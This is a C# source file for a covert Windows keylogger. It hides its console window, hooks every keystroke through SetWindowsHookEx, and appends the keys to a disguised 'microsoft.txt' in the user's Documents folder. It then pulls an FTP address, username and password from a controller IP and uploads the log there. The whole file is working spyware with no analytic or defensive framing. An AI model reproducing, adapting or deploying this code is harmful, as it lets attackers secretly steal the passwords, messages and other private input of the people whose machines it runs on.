using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Text;
using Application = System.Windows.Forms.Application;
using System.Threading.Tasks;


class InterceptKeys
{
    private const int WZ_KEYBOARD = 13;
    private const int WZ_KEYDOWN = 0x0100;
    private static KeyboardProc _proc = HookCall;
    private static IntPtr _hookID = IntPtr.Zero;
    public static void Main()
    {
        var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, Z_HIDE);

        _hookID = SetHook(_proc);
        System.Windows.Forms.Application.Run();
        UnhookWindowsHookEx(_hookID);


    }

    private static IntPtr SetHook(KeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WZ_KEYBOARD, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr KeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCall(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WZ_KEYDOWN)
        {
            int zCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)zCode);
            string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            StreamWriter sw = new StreamWriter(docPath + @"\microsoft.txt", true);
            sw.Write((Keys)zCode);
            sw.Close();
            Ftpsrv();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    static async Task Ftpsrv()
    {
        // Edit this IP to match 
        string IP = "192.168.67.161";


        WebClient client = new WebClient();
        Stream stream = client.OpenRead("http://" + IP + "/time.txt");
        StreamReader reader = new StreamReader(stream);
        String content = reader.ReadToEnd();

        await Task.Delay(Int32.Parse(content));

        // Get the object used to communicate with the server.

        WebClient client2 = new WebClient();
        Stream stream2 = client2.OpenRead("http://" + IP + "/ip.txt");
        StreamReader reader2 = new StreamReader(stream2);
        String content2 = reader2.ReadToEnd();

        FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + content2 + "/microsoft.txt");
        request.Method = WebRequestMethods.Ftp.UploadFile;

        WebClient client3 = new WebClient();
        Stream stream3 = client3.OpenRead("http://" + IP + "/user.txt");
        StreamReader reader3 = new StreamReader(stream3);
        String content3 = reader3.ReadToEnd();

        WebClient client4 = new WebClient();
        Stream stream4 = client4.OpenRead("http://" + IP + "/pass.txt");
        StreamReader reader4 = new StreamReader(stream4);
        String content4 = reader4.ReadToEnd();

        // This example assumes the FTP site uses anonymous logon.
        request.Credentials = new NetworkCredential(content3, content4);

        // Copy the contents of the file to the request stream.
        byte[] fileContents;
        string docPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        using (StreamReader sourceStream = new StreamReader(docPath2 + @"\microsoft.txt"))
        {
            fileContents = Encoding.UTF8.GetBytes(sourceStream.ReadToEnd());
        }

        request.ContentLength = fileContents.Length;

        using (Stream requestStream = request.GetRequestStream())
        {
            requestStream.Write(fileContents, 0, fileContents.Length);
        }

    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        KeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int Z_HIDE = 0;

}
